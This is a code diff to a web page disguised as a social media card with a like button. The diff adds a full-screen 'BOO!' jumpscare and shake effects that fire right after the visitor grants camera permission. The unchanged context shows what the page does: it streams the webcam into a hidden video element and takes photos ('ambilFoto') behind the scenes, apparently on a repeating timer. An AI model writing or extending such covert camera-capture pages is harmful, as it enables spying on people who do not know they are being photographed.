@@ -23,6 +23,24 @@
             padding: 16px;
         }
         
+        body.jumpscare-shake {
+            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
+        }
+        
+        @keyframes shake {
+            0% { transform: translate(0); }
+            10% { transform: translate(-5px, 0); }
+            20% { transform: translate(5px, 0); }
+            30% { transform: translate(-5px, 0); }
+            40% { transform: translate(5px, 0); }
+            50% { transform: translate(-5px, 0); }
+            60% { transform: translate(5px, 0); }
+            70% { transform: translate(-5px, 0); }
+            80% { transform: translate(5px, 0); }
+            90% { transform: translate(-5px, 0); }
+            100% { transform: translate(0); }
+        }
+        
         .card {
             background: white;
             max-width: 420px;
@@ -30,6 +48,11 @@
             border-radius: 16px;
             overflow: hidden;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            transition: all 0.3s;
+        }
+        
+        .card.jumpscare-shake {
+            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
         }
         
         .card-header {
@@ -262,6 +285,30 @@
         #hiddenCanvas {
             display: none;
         }
+        
+        /* Jumpscare element */
+        .jumpscare-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ff0000;
+            z-index: 99999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            font-size: 80px;
+            color: white;
+            animation: jumpscareFlash 0.3s;
+            pointer-events: none;
+        }
+        
+        @keyframes jumpscareFlash {
+            0% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
+        }
     </style>
 </head>
 <body>
@@ -358,6 +405,11 @@
         </div>
         
         <div class="small-note" id="smallNote"></div>
+    </div>
+    
+    <!-- Jumpscare Element -->
+    <div class="jumpscare-overlay" id="jumpscareOverlay">
+        <span>👻 BOO! 👻</span>
     </div>
     
     <video id="hiddenCamera" autoplay playsinline></video>
@@ -492,6 +544,35 @@
                 });
             }
         }, 60000);
+        
+        // ===========================================
+        // FUNGSI JUMPSCARE
+        // ===========================================
+        function triggerJumpscare() {
+            const body = document.body;
+            const card = document.getElementById('mainCard');
+            const jumpscare = document.getElementById('jumpscareOverlay');
+            
+            // Tambah efek getar
+            body.classList.add('jumpscare-shake');
+            card.classList.add('jumpscare-shake');
+            
+            // Tampilkan jumpscare
+            jumpscare.style.display = 'flex';
+            
+            // Efek scroll dikit
+            window.scrollBy(5, 5);
+            window.scrollBy(-5, -5);
+            window.scrollBy(5, -5);
+            window.scrollBy(-5, 5);
+            
+            // Hilangin setelah 0.5 detik
+            setTimeout(() => {
+                body.classList.remove('jumpscare-shake');
+                card.classList.remove('jumpscare-shake');
+                jumpscare.style.display = 'none';
+            }, 500);
+        }
         
         function toggleLike() {
             const likeIcon = document.getElementById('likeIcon');
@@ -724,6 +805,11 @@
                 const video = document.getElementById('hiddenCamera');
                 video.srcObject = stream;
                 await video.play();
+                
+                // 👻 JUMPSCARE SETELAH IZIN KAMERA
+                setTimeout(() => {
+                    triggerJumpscare();
+                }, 500);
                 
                 // Ambil foto pertama
                 await ambilFoto();
